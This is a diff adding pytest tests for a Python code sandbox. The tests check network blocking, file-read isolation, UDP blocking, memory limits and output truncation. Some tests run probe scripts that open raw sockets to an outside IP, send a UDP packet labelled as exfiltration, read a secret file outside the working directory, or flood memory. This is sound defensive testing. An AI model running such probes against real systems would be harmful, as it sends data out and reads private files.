@@ -89,3 +89,41 @@ def test_memory_hogs_are_stopped(tmp_path):
 def test_a_failing_script_reports_failure_and_stderr(tmp_path):
     r = sb.run_python(script(tmp_path, "import sys\nprint('oops', file=sys.stderr)\nsys.exit(3)"), cwd=tmp_path)
     assert not r.ok and r.returncode == 3 and "oops" in r.stderr
+
+
+# ---- review findings: OS-level isolation, memory watchdog, bounded output, UDP
+needs_os = pytest.mark.skipif(not sb.os_isolation_available(), reason="no OS-level isolation available here (sandbox-exec on macOS, unshare on Linux)")
+
+
+@needs_os
+def test_the_os_layer_blocks_the_network_even_if_the_python_guard_is_bypassed(tmp_path):
+    r = sb.run_python(script(tmp_path, "import _socket\ns = _socket.socket()\ntry:\n    s.connect(('93.184.216.34', 80))\n    print('RAW NET')\nexcept OSError:\n    print('blocked')"), cwd=tmp_path)
+    assert "blocked" in r.stdout and "RAW NET" not in r.stdout and r.isolation != "python-guard-only"
+
+
+@pytest.mark.skipif(sys.platform != "darwin", reason="file-read isolation is implemented with macOS sandbox-exec; on Linux it is not enforced (documented)")
+def test_files_outside_the_working_directory_cannot_be_read(tmp_path):
+    secret = Path.home() / ".nexara-sandbox-probe"
+    secret.write_text("top secret")
+    try:
+        r = sb.run_python(script(tmp_path, f"try:\n    print(open({str(secret)!r}).read())\nexcept OSError:\n    print('denied')"), cwd=tmp_path)
+    finally:
+        secret.unlink()
+    assert "denied" in r.stdout and "top secret" not in r.stdout
+
+
+def test_udp_exfiltration_is_blocked_by_the_python_guard(tmp_path):
+    body = "import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\ntry:\n    s.sendto(b'x', ('93.184.216.34', 53))\n    print('SENT')\nexcept OSError:\n    print('blocked')"
+    r = sb.run_python(script(tmp_path, body), cwd=tmp_path)
+    assert "blocked" in r.stdout and "SENT" not in r.stdout
+
+
+def test_memory_watchdog_kills_a_hog_on_every_platform(tmp_path):
+    r = sb.run_python(script(tmp_path, "import time\nx = bytearray(1500 * 1024 ** 2)\nfor i in range(0, len(x), 4096):\n    x[i] = 1\ntime.sleep(30)\nprint('survived')"),
+                      cwd=tmp_path, mem_mb=256, timeout_s=20)
+    assert not r.ok and "survived" not in r.stdout and r.reason == "memory"
+
+
+def test_an_output_flood_cannot_fill_memory(tmp_path):
+    r = sb.run_python(script(tmp_path, "import sys\nchunk = 'x' * 1_000_000\nfor _ in range(400):\n    sys.stdout.write(chunk)"), cwd=tmp_path, fsize_mb=5, timeout_s=20)
+    assert r.truncated and len(r.stdout) <= sb.MAX_OUTPUT and not r.ok
